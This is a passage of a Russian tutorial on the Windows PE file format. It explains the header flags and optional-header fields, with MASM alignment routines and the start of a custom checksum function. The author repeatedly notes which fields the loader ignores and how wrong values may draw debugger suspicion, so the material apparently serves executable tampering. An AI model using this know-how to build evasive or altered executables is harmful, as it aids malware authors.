<dt><strong>DWORD PointerToSymbolTable;</strong></dt><dd>Указатель на COFF-таблицу символов PE-формата. Эту же информацию можно найти в элементе массива DataDirectory с индексом IMAGE_DIRECTORY_ENTRY_DEBUG. Если Вы вдруг не знали, то отладочная информация нужна только для отладчика. Отсюда следует, что мы может размещать в этом поле любое значение.</dd>
<dt><strong>DWORD NumberOfSymbols;</strong></dt><dd>Количество символов в COFF-таблице символов. Может принимать любое значение.</dd>
<dt><strong>WORD SizeOfOptionalHeader;</strong></dt><dd>Размер опционального заголовка. Опциональный заголовок следует сразу же за файловым заголовком. Размер опционального заголовка зависит от массива DataDirectory, а именно от количества элементов в нем. Обычно в нем 16 элементов, но могут быть и неожиданности. Это поле проверяется загрузчиком и должно быть правильным.</dd>
<dt><strong>WORD Characteristics;</strong></dt><dd>Характеристики - это атрибуты специфичные для данного PE-файла. Поле Characteristics 16 битное поле и каждый установленный бит представляет из себя отдельный флаг. Знаете, я не ленив, и опишу все возможные флаги подробно. Конечно, большинство из них не используются в данное время, ведь PE-формат был создан в 1993 году. С этого времени много вещей стали не важны. Но это информация общеобразовательная. Прочитайте, если Вы хотите быть более гибки в области операционных систем.
<p>Определены следующие значения:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_FILE_FS_STRIPPED&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0001</span></div>
<p>В файле отсутствует информация о базовых поправках. Этот флаг не используется в исполняемых файлах. Вместо этого информация о базовых поправках храниться в каталоге, на который указывает элемент в массиве DataDirectory с индексом IMAGE_DIRECTORY_ENTRY_BASERELOC.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_FILE_EXECUTABLE_IMAGE &nbsp; &nbsp; 0x0002</span></div>
<p>Файл является исполняемым (т.е. не содержит нераспознанных внешних ссылок). Если файл является исполняемым, то он не является объектным файлом или библиотекой.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_FILE_LINE_NUMS_STRIPPED &nbsp; 0x0004</span></div>
<p>В файле отсутствуют номера строк. Это значение не используется в исполняемых файлах.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_FILE_LOCAL_SYMS_STRIPPED&nbsp; 0x0008</span></div>
<p>Локальные символы отсутствуют в файле. Это значение не используется в исполняемых файлах.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_FILE_AGGRESIVE_WS_TRIM&nbsp; &nbsp; 0x0010</span></div>
<p>Этот флаг установлен, если операционная система ограничивает программу памятью, агрессивно сбрасывая данные приложения в страничный файл. Этот флаг устанавливается для приложений, которые большую часть своего времени ждут, лишь очень редко пробуждаясь.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_FILE_LARGE_ADDRESS_AWARE&nbsp; 0x0020</span></div>
<p>Флаг, чтобы приложение могла работать с объемом памяти больше 2 или 3 Гб (в зависимости от загрузочного параметра).</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_FILE_BYTES_REVERSED_LO&nbsp; &nbsp; 0x0080</span></div> и
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_FILE_BYTES_REVERSED_HI&nbsp; &nbsp; 0x8000</span></div>
<p>Эти флаги устанавливаются если порядок байт в конце файла, отличен от порядка байт для текущей архитектуры. Т.к. порядок байт в процессорах Intel одинаковый, то этот параметр в данное время не используется.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_FILE_32BIT_MACHINE&nbsp; &nbsp; &nbsp; &nbsp; 0x0100</span></div>
<p>Этот флаг установлен, если предполагается, что машина 32- разрядная. Вероятно, если файл будет собран при помощи 64-разраного линкера, то этот флаг не будет установлен.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_FILE_DEBUG_STRIPPED &nbsp; &nbsp; &nbsp; 0x0200</span></div>
<p>Отладочная информация отсутствует в файле. Этот параметр не используется для исполняемых файлов.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP&nbsp; &nbsp; &nbsp; 0x0400</span></div>
<p>Этот флаг установлен, если приложение может не запуститься с переносного носителя, дискеты или CD-ROM. В этом случае ОС переносит данные исполняемый файл в файл подкачки и считывает его оттуда. Но этот флаг в данный момент избыточен, т.к. ОС сама переносит исполняемый файл в файл подкачки, если он находиться на подобном съемном носителе.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_FILE_NET_RUN_FROM_SWAP&nbsp; &nbsp; 0x0800</span></div>
<p>Флаг установлен, если приложение может не запуститься по сети. Но этот флаг в данный момент избыточен, т.к. ОС сама переносит исполняемый файл в файл подкачки, если он находиться на общем сетевом ресурсе.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_FILE_SYSTEM &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x1000</span></div>
<p>Этот флаг установлен, если данный файл является системным, подобно драйверу. В настоящее время не используется.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_FILE_DLL&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x2000</span></div>
<p>Данный файл - это динамически подключаемая библиотека(Dinamic Link Library). Каждая DLL обязана иметь этот флаг, иначе она не загрузиться. Этот флаг может использоваться EXE, и при этом быть корректным исполняемым файлом.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_FILE_UP_SYSTEM_ONLY &nbsp; &nbsp; &nbsp; 0x4000</span></div>
<p>Этот флаг установлен, если приложение не предназначено для многопроцессорных платформ.</p>
</dd>
</dl>
<p>Главные поля в файловом заголовке - это количество секций и размер опционального заголовка. Остальные нужны очень редко или не нужны вовсе.</p>
<h3><a name="c26"></a>Опциональный заголовок</h3>
<p>В опциональном заголовке храниться более специфическая информация о приложении и его потребностях. Я не хочу утомлять Вас, но если Вы это читаете, то будьте добры читать все. Здесь я опишу все поля опционального заголовка. В любом случае тонкости PE-формата нам пригодятся. А где пригодятся, Вы узнаете в этой главе. Следите внимательно.</p>
<p>В WINNT. H опциональный заголовок - это структура IMAGE_OPTIONAL_HEADER. Она определена следующим образом:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> _IMAGE_OPTIONAL_HEADER <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Стандартные поля</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; Magic<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; BYTE&nbsp; &nbsp; MajorLinkerVersion<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; BYTE&nbsp; &nbsp; MinorLinkerVersion<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; SizeOfCode<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; SizeOfInitializedData<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; SizeOfUninitializedData<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; AddressOfEntryPoint<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; BaseOfCode<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; BaseOfData<span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// дополнительные поля NT</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; ImageBase<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; SectionAlignment<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; FileAlignment<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; MajorOperatingSystemVersion<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; MinorOperatingSystemVersion<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; MajorImageVersion<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; MinorImageVersion<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; MajorSubsystemVersion<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; MinorSubsystemVersion<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; Win32VersionValue<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; SizeOfImage<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; SizeOfHeaders<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; CheckSum<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; Subsystem<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; DllCharacteristics<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; SizeOfStackReserve<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; SizeOfStackCommit<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; SizeOfHeapReserve<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; SizeOfHeapCommit<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; LoaderFlags<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; NumberOfRvaAndSizes<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; IMAGE_DATA_DIRECTORY&nbsp; &nbsp; DataDirectory<span style="color: black;">&#91;</span>IMAGE_NUMBEROF_DIRECTORY_ENTRIES<span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span> IMAGE_OPTIONAL_HEADER32<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>PIMAGE_OPTIONAL_HEADER32<span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>Как Вы уже, наверное, заметили, опциональный заголовок абстрактно делится на две части: стандартные поля и дополнительные поля NT. Естественно на реализации это деление не отражается. Рассмотрим поля по порядку. Кстати, опциональный заголовок так называется, потому что, если рассматривать в общем стандарт PE/COFF файлов, то для объектных файлов COFF-формата он отсутствует. Для исполняемых файлов этот заголовок является обязательным. А то некоторые авторитетные товарищи удивляются, почему этот заголовок называется опциональным. А это написано черным по белому в спецификации Microsoft PE-формата. Размер опционального заголовка не является фиксированным и чтобы узнать его надо обратиться к файловому заголовку.</p>
<dl>
<dt><strong>WORD Magic;</strong></dt>
<dd>Это слово служит, чтобы проверить для какой версии спецификации PE этот опциональный заголовок. Возможные значения:
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_NT_OPTIONAL_HDR32_MAGIC &nbsp; 0x10b</span></div>
<p>Для спецификации PE32</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_NT_OPTIONAL_HDR64_MAGIC &nbsp; 0x20b</span></div>
<p>Для спецификации PE64</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_ROM_OPTIONAL_HDR_MAGIC&nbsp; &nbsp; 0x107</span></div>
<p>Если исполняемый файл после проекции его загрузчиком будет только для чтения. Не используется в настоящее время.</p>
<p>Для 32х разрядных ОС есть одно возможное значение - <strong>IMAGE_NT_OPTIONAL_HDR32_MAGIC</strong></p>
</dd>
<dt><strong>BYTE MajorLinkerVersion;</strong></dt><dd>Старшее слово версии линковщика, создавшего данный файл. Может быть любым.</dd>
<dt><strong>BYTE MinorLinkerVersion;</strong></dt><dd>Младшее слово версии линковщика, создавшего данный файл. Может быть любым.</dd>
<dt><strong>DWORD SizeOfCode;</strong></dt><dd>Размер секции кода или сумма всех секций кода. В Windows XP SP2 может быть любым, на остальных ОС надо тестировать отдельно, но, скорее всего, дело обстоит точно также. Но если это значение неправильное это может вызвать подозрение у разных отладчиков etc.</dd>
<dt><strong>DWORD SizeOfInitializedData;</strong></dt><dd>Размер секции с инициализированными данными. То же самое, что и с прошлым параметром.</dd>
<dt><strong>DWORD SizeOfUninitializedData;</strong></dt><dd>Размер секции с неинициализированными данными. То же самое, что и с прошлым параметром.</dd>
<dt><strong>DWORD AddressOfEntryPoint;</strong></dt><dd>Адрес, с которого начинают считываться инструкции для выполнения. Адрес является RVA. Чтобы указать на адрес ниже базового можно использовать отрицательные значения, т.е. в дополнительном коде. По-другому это называется - целочисленное переполнение.</dd>
<dt><strong>DWORD BaseOfCode;</strong></dt><dd>RVA откуда начинаются секция(и) кода исполняемого файла. Может быть любым значением, т.к. не используются загрузчиками. Но если это значение неправильное это может вызвать подозрение у разных отладчиков etc.</dd>
<dt><strong>DWORD BaseOfData;</strong></dt><dd>RVA откуда начинаются секция(и) данных исполняемого файла. Может быть любым значением, т.к. не используются загрузчиками.</dd>
<dt><strong>DWORD ImageBase;</strong></dt><dd>При запуске PE-файла он будет отображен по частям, начиная с некоторого адреса в памяти. Адрес отображения называется <em>базовым адресом</em> для данного файла. В данном поле храниться базовый адрес PE-файла. Этот файл естественно является VA. От него отсчитываются все RVA. Еcли файл не загружается по каким-то причинам (по этому адресу помять уже зарезервирована) по данному адресу, то загрузчику необходимо применять базовые поправки. Обычно файл загружается по базовому адресу и базовые поправки не нужны. Это позволяет использовать базовые поправки в своих целях. Для компоновщиков, по умолчанию устанавливается базовый адрес 400000H.</dd>
<dt><strong>DWORD SectionAlignment;</strong></dt><dd>Секция при загрузке PE-файла в память будет начинаться с адреса кратного данной величине. Вот ограничения данного поля. 1) Это значение представляет собой степень двойки. 2) SectionAlignment&gt;=FileAlignment. Пусть нам дано значение адреса. Нам надо получить выровненное значение в соответствии с выравниванием. Для этого можно использовать следующую формулу:
<p><img src="/img/cache/d8aebf1bdd5dd2d1dd506c1d19b96875.gif" alt="z=(x+(y-1))&amp;(~(y-1)) (3)" valign="middle"/>,</p>
<p>где x - выравниваемое значение, y - выравнивающий фактор.</p>
<p>Посмотрите на пример функции, которое выравнивает вверх нужное значение:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;=========================================</span><br/>
<span style="color: black; font-style: italic;">;Процедура GetAlignUP</span><br/>
<span style="color: black; font-style: italic;">;Получение выровненного-вверх значения</span><br/>
<span style="color: black; font-style: italic;">;Вход: esi - значение для выравнивания</span><br/>
<span style="color: black; font-style: italic;">; edi - выравнивающий фактор</span><br/>
<span style="color: black; font-style: italic;">;Выход:eax - выровненное значение</span><br/>
<span style="color: black; font-style: italic;">;=========================================</span><br/>
GetAlignUp&nbsp; &nbsp; &nbsp; proc<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">not</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
GetAlignUp&nbsp; &nbsp; &nbsp; endp<br/>
<span style="color: black; font-style: italic;">;=========================================</span><br/>
<span style="color: black; font-style: italic;">;Конец процедуры GetAlignUP</span><br/>
<span style="color: black; font-style: italic;">;</span><br/>
<span style="color: black; font-style: italic;">;=========================================</span><br/>
&nbsp;</div>
<p>Вот процедура, которая выравнивает вниз нужное значение:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;=========================================</span><br/>
<span style="color: black; font-style: italic;">;Процедура GetAlignDown</span><br/>
<span style="color: black; font-style: italic;">;Получение выровненного-вниз значения</span><br/>
<span style="color: black; font-style: italic;">;Вход: esi - значение для выравнивания</span><br/>
<span style="color: black; font-style: italic;">; edi - выравнивающий фактор</span><br/>
<span style="color: black; font-style: italic;">;Выход:eax - выровненное значение</span><br/>
<span style="color: black; font-style: italic;">;=========================================</span><br/>
GetAlignDown&nbsp; &nbsp; proc<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">not</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
GetAlignDown&nbsp; &nbsp; endp<br/>
<span style="color: black; font-style: italic;">;=========================================</span><br/>
<span style="color: black; font-style: italic;">;Конец процедуры GetAlignDown</span><br/>
<span style="color: black; font-style: italic;">;</span><br/>
=========================================<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;p&gt;А вот макросы на Си делающие то же самое<span style="color: #339933;">:</span>&lt;<span style="color: #339933;">/</span>p&gt;<br/>
&lt;src lang=<span style="color: #7f007f;">&quot;c&quot;</span>&gt;<br/>
#define ALIGN_DOWN<span style="color: black;">&#40;</span>x<span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">align</span><span style="color: black;">&#41;</span>&nbsp; &nbsp; <span style="color: black;">&#40;</span>x &amp; ~<span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">align</span><span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">//</span>выравнивание вниз<br/>
#define ALIGN_UP<span style="color: black;">&#40;</span>x<span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">align</span><span style="color: black;">&#41;</span>&nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>x &amp; <span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">align</span><span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> ? ALIGN_DOWN<span style="color: black;">&#40;</span>x<span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">align</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #0000ff; font-weight: bold;">align</span><span style="color: #339933;">:</span>x<span style="color: black;">&#41;</span> <span style="color: #339933;">//</span>выравнивание вверх<br/>
&nbsp;</div>
</dd>
<dt><strong>DWORD FileAlignment;</strong></dt><dd>Эта величина соответствует смещению секций в файле. Размер каждой секции кратен данной величине. Вот ограничения данного поля: 1) Это значение представляет собой степень двойки. 2) Должно быть между 200H и 10000H. 3) SectionAlignment&gt;=FileAlignment. Вы также можете использовать функцию GetAlign для получения выровненного значения.</dd>
<dt><strong>WORD MajorOperatingSystemVersion;</strong></dt>
<dt><strong>WORD MinorOperatingSystemVersion;</strong></dt>
<dd>Версия ОС, для которой данный файл предназначен. Совершенно никем не проверяемое поле. Может быть любым, но лучше чтобы не нулевое, а то кто-то ругался (привет Hard Wisdom!)</dd>
<dt><strong>WORD MajorImageVersion;</strong></dt>
<dt><strong>WORD MinorImageVersion;</strong></dt>
<dd>Это поле специально для того, чтобы программист создающий программу мог указать версию исполняемого образа. Может быть любым.</dd>
<dt><strong>WORD MajorSubsystemVersion;</strong></dt>
<dt><strong>WORD MinorSubsystemVersion;</strong></dt>
<dd>Поле содержит самую старую версию подсистемы, позволяющую запускать данный файл. Должно быть правильным.</dd>
<dt><strong>DWORD Win32VersionValue;</strong></dt><dd>Зарезервировано. Может быть любым.</dd>
<dt><strong>DWORD SizeOfImage;</strong></dt><dd>Содержит общий размер всех частей отображения. Важно, что загрузчик проверяет значение этого поля по следующей формуле:
<p><img src="/img/cache/d81ff882cdfc25035cbb010fd86cd341.gif" alt="SizeOfImage = VirtualSize + VirtualAddress" valign="middle"/> (4),</p>
<p>где VirtualSize и VirtualAddress значения соответствующие последней секции</p></dd>
<dt><strong>DWORD SizeOfHeaders;</strong></dt><dd>Размер заголовков. Вычисляется по формуле
<p><img src="/img/cache/76f891343e846534f412ec5d3894f113.gif" alt="SizeOfHeaders = DOS Stub + PE Header + Object Table (5)" valign="middle"/></p>
<p>Кратно значению FileAlignment. Должно быть корректным.</p></dd>
<dt><strong>DWORD CheckSum;</strong></dt>
<dd>Контрольная сумма образа файла. Для обычных исполняемых файлов контрольная сумма не проверяется, т.е. может быть любой. Если она нулевая, то она тоже может быть любой. Для всех системных DLL должна быть корректная. Алгоритм контрольной суммы не является закрытым как говорят некоторые. Чтобы получить контрольную сумму данного исполняемого файла надо вызвать функцию CheckSumMappedFile с соответствующими параметрами. Эта функция доступна из библиотеки imagehlp.dll. В этой библиотеке содержится набор функций чтобы работать с PE-файлами. Но нам с Вами эти дурацкие библиотеки не нужны, т.к. мы делаем все вручную (почти все :)). Научитеcь делать сначала вручную, потом используйте свои библиотеки и свой очень компактный, и очень маленький код. Библиотека imagehlp.dll входит в состав ОС и прототипы соответствующих функций содержатся в Imagehlp.h. В статье "Make your own CheckSumMappedFile- by Bumblebee/29a обсуждается, как сделать свою функцию CheckSumMappedFile, но, к сожалению, то что сделал Bumblebee не работает :( Я подправил его код и получилась рабочая функция. Ниже в листинге приведена функция и пример ее использования.
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;===============================================================</span><br/>
<span style="color: black; font-style: italic;">;</span><br/>
<span style="color: black; font-style: italic;">; Реализация собственной функции CheckSumMappedFile</span><br/>
<span style="color: black; font-style: italic;">;</span><br/>
<span style="color: black; font-style: italic;">;===============================================================</span><br/>
<span style="color: #ff0000;">.386</span><br/>
option casemap<span style="color: #339933;">:</span>none<br/>
<span style="color: #339933;">.</span>model <span style="color: #0000ff; font-weight: bold;">flat</span><span style="color: #339933;">,</span>stdcall<br/>
include \tools\masm32\include\windows<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br/>
includelib \tools\masm32\lib\kernel32<span style="color: #339933;">.</span>lib<br/>
include \tools\masm32\include\kernel32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br/>
<span style="color: #0000ff; font-weight: bold;">.data</span><br/>
hFile &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
hMapping&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
hMap&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
Name1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">&quot;C:\\kernel32.dll&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
HeaderSum &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0fffh</span><br/>
CheckSum&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
<span style="color: #0000ff; font-weight: bold;">start</span><span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; CreateFile<span style="color: #339933;">,</span>offset Name1<span style="color: #339933;">,</span>GENERIC_WRITE <span style="color: #00007f; font-weight: bold;">or</span><br/>
